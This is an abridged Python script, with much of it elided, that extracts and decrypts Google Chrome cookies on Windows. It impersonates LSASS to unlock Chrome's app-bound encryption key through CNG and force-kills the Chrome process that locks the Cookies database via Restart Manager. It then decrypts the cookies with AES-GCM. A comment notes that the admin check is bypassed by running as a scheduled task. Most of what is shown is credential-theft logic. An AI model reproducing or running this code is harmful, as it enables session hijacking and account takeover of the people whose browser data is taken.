...
def decrypt_with_cng(input_data):
    ...
    ncrypt.NCryptOpenKey(hP, ctypes.byref(hK), "Google Chromekey1", 0, 0)
    pcb = gdef.DWORD(0)
...
def _rstrtmgr_copy(src, dst):
    ...
    Kills only the specific Chrome subprocess holding the file lock.
    Based on: https://gist.github.com/csm10495/e89e660ffee0030e8ef410b793ad6a7e
    """
    ...
    try:
        rstrtmgr.RmRegisterResources(
            ...
            0, None, 0, None)
        rstrtmgr.RmShutdown(sh, 1, _cb)  # RmForceShutdown=1
    finally:
        rstrtmgr.RmEndSession(sh)
    shutil.copy2(src, dst)

def derive_master_key(parsed):
    if parsed['flag'] == 1:
        ...
        with impersonate_lsass():
            dec_key = decrypt_with_cng(parsed['encrypted_aes_key'])
...
def main():
    # Admin check bypassed - running via scheduled task
    ...
    master_key = derive_master_key(parsed)
    cipher = AESGCM(master_key)

    print("[4/4] Decrypting cookies...")
    with tempfile.TemporaryDirectory() as td:
        tmp_db = os.path.join(td, "Cookies")
        # Try direct copy; if locked, use Rstrtmgr to kill the locking subprocess
